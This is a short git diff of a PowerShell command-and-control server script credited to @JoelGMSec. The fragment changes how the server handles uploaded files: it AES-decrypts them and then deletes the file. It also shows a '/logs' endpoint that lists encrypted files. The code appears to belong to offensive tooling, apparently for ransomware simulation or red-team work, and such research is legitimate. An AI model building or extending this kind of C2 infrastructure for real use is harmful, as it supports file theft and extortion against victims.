@@ -1,4 +1,4 @@
-#================================#
+﻿#================================#
 #     C2Server by @JoelGMSec     #
 #      https://darkbyte.net      #
 #================================#
@@ -175,9 +175,8 @@ if ($context.Request.HttpMethod -eq "POST") {
       if (-not (Test-Path $C2Rfile)) { if ((Get-Host).Version.Major -gt 5) {
          Add-Content -Path $C2Rfile -Value $B64file -AsByteStream } else { 
          Add-Content -Path $C2Rfile -Value $B64file -Encoding Byte  }
-         Invoke-AESEncryption -Mode Decrypt -Key $B64Key -Path $C2Rfile 
-         foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object {
-            ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { Remove-Item $i }}}}
+         Invoke-AESEncryption -Mode Decrypt -Key $B64Key -Path $C2Rfile }}
+         Remove-Item $C2Rfile }
 
    if ($context.Request.RawUrl -eq "/logs") { 
       Write-Host ; Write-Host "[i] Getting encrypted files list.." -f Green -NoNewLine
